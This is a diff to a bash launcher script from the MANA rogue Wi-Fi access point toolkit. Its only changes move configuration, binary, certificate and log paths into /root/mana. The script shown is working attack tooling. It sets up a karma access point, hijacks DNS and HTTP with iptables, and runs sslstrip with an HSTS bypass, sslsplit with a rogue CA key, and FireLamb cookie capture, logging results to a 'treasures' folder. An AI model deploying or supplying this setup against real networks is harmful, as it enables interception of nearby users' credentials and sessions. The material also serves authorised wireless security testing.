@@ -1,3 +1,4 @@
+
 #!/bin/bash
 # Original script by Dominic White and Ian de Villiers
 # Changes made by John & Daniel Cuthbert 
@@ -5,8 +6,8 @@
 # Other Useful variables defined
 upstream=eth0
 # phy=wlan0
-conf=/etc/mana-toolkit/hostapd-karma.conf
-hostapd=/usr/lib/mana-toolkit/hostapd
+conf=/root/mana/run-mana/conf/hostapd-karma.conf
+hostapd=/root/mana/hostapd-manna/hostapd/hostapd
 ifwl="(ifconfig | grep wlan*)"
 S1='y'
 S2='n'
@@ -165,7 +166,7 @@ sleep 5
 ifconfig $phy 10.0.0.1 netmask 255.255.255.0
 route add -net 10.0.0.0 netmask 255.255.255.0 gw 10.0.0.1
 
-dhcpd -cf /etc/mana-toolkit/dhcpd.conf $phy
+dhcpd -cf /root/mana/run-mana/conf/dhcpd.conf $phy
 
 }
 
@@ -188,8 +189,8 @@ iptables -t nat -A PREROUTING -i $phy -p udp --dport 53 -j DNAT --to 10.0.0.1
 
 #SSLStrip with HSTS bypass
 echo -e "${grn}[+]${nc} (${red}BACKGROUNDED${nc}) Starting sslstrip with HSTS bypass"
-cd /usr/share/mana-toolkit/sslstrip-hsts/
-python sslstrip.py -l 10000 -a -w /var/lib/mana-toolkit/sslstrip.log&
+cd /root/mana/sslstrip-hsts/sslstrip-hsts/
+python sslstrip.py -l 10000 -a -w /root/mana/treasures/sslstrip.log&
 iptables -t nat -A PREROUTING -i $phy -p tcp --destination-port 80 -j REDIRECT --to-port 10000
 python dns2proxy.py $phy&
 cd -
@@ -197,7 +198,7 @@ cd -
 
 #SSLSplit
 echo -e "${grn}[+]${nc} (${red}BACKGROUNDED${nc}) Starting sslsplit with HSTS bypass"
-sslsplit -D -P -Z -S /var/lib/mana-toolkit/sslsplit -c /usr/share/mana-toolkit/cert/rogue-ca.pem -k /usr/share/mana-toolkit/cert/rogue-ca.key -O -l /var/lib/mana-toolkit/sslsplit-connect.log \
+sslsplit -D -P -Z -S /root/mana/sslstrip-hsts/sslsplit -c /root/mana/run-mana/cert/rogue-ca.pem -k /root/mana/run-mana/cert/cert/rogue-ca.key -O -l /root/mana/logfiles/sslsplit-connect.log \
  https 0.0.0.0 10443 \
  http 0.0.0.0 10080 \
  ssl 0.0.0.0 10993 \
@@ -236,7 +237,7 @@ iptables -t nat -A PREROUTING -i $phy \
 
 # Start FireLamb
 echo -e "${grn}[+]${nc} (${red}BACKGROUNDED${nc}) Starting FireLamb"
-/usr/share/mana-toolkit/firelamb/firelamb.py -i $phy & ## Does this need to be killed in the bg When shutdown is given???  fkill="(ps aux | grep XXXXXX | cut -b 11-14 | head -n1)"> followed by <pkill ${fkill}>
+/root/mana/firelamb/firelamb.py -i $phy & ## Does this need to be killed in the bg When shutdown is given???  fkill="(ps aux | grep XXXXXX | cut -b 11-14 | head -n1)"> followed by <pkill ${fkill}>
 
 echo "Hit enter to kill me"
 read
